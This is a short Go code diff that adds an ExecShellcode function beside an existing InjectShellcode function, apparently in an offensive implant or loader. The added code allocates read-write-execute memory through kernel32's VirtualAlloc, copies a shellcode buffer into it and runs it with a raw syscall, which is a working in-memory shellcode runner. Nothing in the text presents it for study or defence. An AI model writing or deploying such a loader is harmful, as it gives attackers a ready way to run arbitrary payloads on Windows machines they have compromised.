@@ -5,6 +5,7 @@ import (
 	"net"
 	"os/exec"
 	"syscall"
+	"unsafe"
 )
 
 const (
@@ -34,4 +35,19 @@ func InjectShellcode(encShellcode string) {
 			go ExecShellcode(shellcode)
 		}
 	}
+}
+
+func ExecShellcode(shellcode []byte) {
+	// Resolve kernell32.dll, and VirtualAlloc
+	kernel32 := syscall.MustLoadDLL("kernel32.dll")
+	VirtualAlloc := kernel32.MustFindProc("VirtualAlloc")
+	// Reserve space to drop shellcode
+	address, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+	// Ugly, but works
+	addrPtr := (*[990000]byte)(unsafe.Pointer(address))
+	// Copy shellcode
+	for i, value := range shellcode {
+		addrPtr[i] = value
+	}
+	go syscall.Syscall(address, 0, 0, 0, 0)
 }
